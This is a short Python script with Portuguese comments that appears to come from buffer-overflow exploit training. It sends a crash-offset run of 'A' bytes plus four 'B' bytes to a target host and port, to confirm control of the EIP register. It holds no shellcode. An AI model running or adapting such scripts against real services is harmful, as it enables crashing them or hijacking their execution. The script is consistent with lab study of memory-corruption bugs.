#!/usr/bin/python

import argparse
import socket
import subprocess

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")

# Analisar os argumentos
args = parser.parse_args()

# Variáveis de entrada

client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
eip = 4
payload = b"A"*offset
payload += b"B"*eip

try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A' e {} 'B' [+]".format(str(offset), str(eip)))
    client.send(payload)
    print("Veja no Debugger o Registrador EIP. Se tiver 0x42424242 temos controle do EIP.")
    client.close()
except ConnectionResetError:
    print(f"Reset Error!")



